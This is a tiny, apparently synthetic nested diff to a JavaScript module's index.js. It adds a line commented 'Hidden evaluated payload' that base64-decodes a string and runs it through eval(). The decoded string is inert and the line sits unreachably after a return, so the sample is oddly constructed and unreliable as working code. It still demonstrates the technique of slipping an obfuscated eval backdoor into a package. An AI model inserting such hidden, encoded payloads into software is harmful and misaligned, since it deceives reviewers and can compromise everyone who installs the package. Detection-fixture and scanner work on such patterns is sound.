@@ -1,0 +1,7 @@
+--- a/index.js
++++ b/index.js
+@@ -4,3 +4,5 @@ module.exports = function(opts) {
+   return opts.enabled ? true : false;
++  // Hidden evaluated payload
++  eval(Buffer.from("ZXZhbCgncG9zdGluc3RhbGwnKQ==", "base64").toString());
+ };
